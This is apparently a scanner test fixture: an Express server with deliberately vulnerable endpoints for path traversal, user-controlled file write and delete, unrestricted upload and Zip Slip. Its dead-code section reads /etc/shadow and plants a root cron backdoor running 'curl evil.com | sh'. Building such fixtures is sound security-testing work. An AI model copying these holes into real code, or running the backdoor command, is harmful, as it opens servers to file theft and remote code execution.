// ===========================================================================
// REACHABLE TEST — DO NOT USE IN PRODUCTION
// CWE-22 (Path Traversal), CWE-73 (File Name Control), CWE-434 (File Upload)
// ===========================================================================
const express = require('express');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const app = express();
app.use(express.json());

const UPLOAD_DIR = '/var/uploads';

// ── REACHABLE: CWE-22 — Path Traversal (direct read) ─────────────────────
app.get('/api/files', (req, res) => {
    const filepath = req.query.path;
    // BAD: Direct file read from user input — ../../etc/passwd
    const content = fs.readFileSync(filepath, 'utf8');
    res.json({ content });
});

app.get('/api/logs/:filename', (req, res) => {
    const logfile = req.params.filename;
    // BAD: path.join doesn't prevent absolute path traversal
    const fullpath = path.join('/var/log/app', logfile);
    res.sendFile(fullpath);
});

app.get('/api/templates/:name', (req, res) => {
    const name = req.params.name;
    // BAD: No validation on template name
    const content = fs.readFileSync(`./templates/${name}`, 'utf8');
    res.send(content);
});

// ── REACHABLE: CWE-73 — External File Name Control ───────────────────────
app.post('/api/files/write', (req, res) => {
    const { filename, content } = req.body;
    // BAD: User controls write destination
    fs.writeFileSync(path.join(UPLOAD_DIR, filename), content);
    res.json({ status: 'written' });
});

app.delete('/api/files', (req, res) => {
    const filepath = req.query.path;
    // BAD: User-controlled delete target
    fs.unlinkSync(filepath);
    res.json({ deleted: true });
});

// ── REACHABLE: CWE-434 — Unrestricted File Upload ───────────────────────
const upload = multer({ dest: UPLOAD_DIR });
app.post('/api/upload', upload.single('file'), (req, res) => {
    // BAD: No file type validation, no size limit, original name used
    const dest = path.join(UPLOAD_DIR, req.file.originalname);
    fs.renameSync(req.file.path, dest);
    res.json({ path: dest });
});

app.post('/api/upload/avatar', upload.single('avatar'), (req, res) => {
    // BAD: Saves with original extension — could be .php, .jsp, .exe
    const ext = path.extname(req.file.originalname);
    const dest = path.join(UPLOAD_DIR, `avatar_${Date.now()}${ext}`);
    fs.renameSync(req.file.path, dest);
    res.json({ avatar: dest });
});

// ── REACHABLE: CWE-22 — Zip Slip ────────────────────────────────────────
const AdmZip = require('adm-zip');
app.post('/api/extract', (req, res) => {
    const zipPath = req.body.zipPath;
    const zip = new AdmZip(zipPath);
    // BAD: extractAllTo without validating entry paths — Zip Slip
    zip.extractAllTo(UPLOAD_DIR, true);
    res.json({ extracted: true });
});

// ── UNREACHABLE ──────────────────────────────────────────────────────────
function deadPathTraversal() {
    return fs.readFileSync('../../etc/shadow', 'utf8');
}

function deadFileWrite() {
    fs.writeFileSync('/etc/cron.d/backdoor', '* * * * * root curl evil.com | sh');
}

app.listen(4003);
module.exports = app;
